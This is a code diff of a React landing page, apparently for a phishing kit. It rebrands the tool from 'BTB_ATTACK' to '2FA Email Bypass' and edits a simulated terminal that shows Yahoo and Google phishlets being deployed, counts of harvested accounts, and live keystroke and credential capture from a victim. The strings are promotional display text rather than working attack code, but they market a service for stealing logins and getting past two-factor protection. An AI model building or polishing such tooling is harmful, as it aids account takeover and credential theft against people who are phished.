@@ -3,7 +3,7 @@ import { Link } from 'react-router-dom'
 import Scene from './Scene'
 import Navbar from './Navbar'
 
-const APP_NAME = import.meta.env.VITE_APP_NAME || 'BTB_ATTACK'
+const APP_NAME = import.meta.env.VITE_APP_NAME || '2FA Email Bypass'
 
 const APP_NAME_PARTS = APP_NAME.split('_')
 
@@ -71,19 +71,19 @@ const features = [
 ]
 
 const terminalLines = [
-  { type: 'cmd', text: '$ btb_attack deploy --phishlet yahoo' },
+  { type: 'cmd', text: '$ 2fa_email_bypass deploy --phishlet yahoo' },
   { type: 'info', text: '[INFO] Building container image...' },
   { type: 'success', text: '[OK] Image built successfully (3.2s)' },
   { type: 'info', text: '[INFO] Starting container phishlet-fb-01...' },
   { type: 'success', text: '[OK] Container running on port 8443' },
-  { type: 'cmd', text: '$ btb_attack status' },
+  { type: 'cmd', text: '$ 2fa_email_bypass status' },
   { type: 'info', text: '┌─────────────────────────────────────────┐' },
   { type: 'info', text: '│ PHISHLET    STATUS    VISITS   HARVESTED │' },
   { type: 'info', text: '├─────────────────────────────────────────┤' },
   { type: 'success', text: '│ yahoo       ACTIVE    127      34        │' },
   { type: 'success', text: '│ google      ACTIVE    89       21        │' },
   { type: 'info', text: '└─────────────────────────────────────────┘' },
-  { type: 'cmd', text: '$ btb_attack logs --live yahoo' },
+  { type: 'cmd', text: '$ 2fa_email_bypass logs --live yahoo' },
   { type: 'data', text: 'NEW VISITOR: 192.168.1.45 → /login' },
   { type: 'data', text: 'KEYSTROKE: j-o-h-n-@-e-x-a-m-p-l-e-.-c-o-m' },
   { type: 'data', text: 'CREDENTIAL CAPTURED: john@example.com ******' },
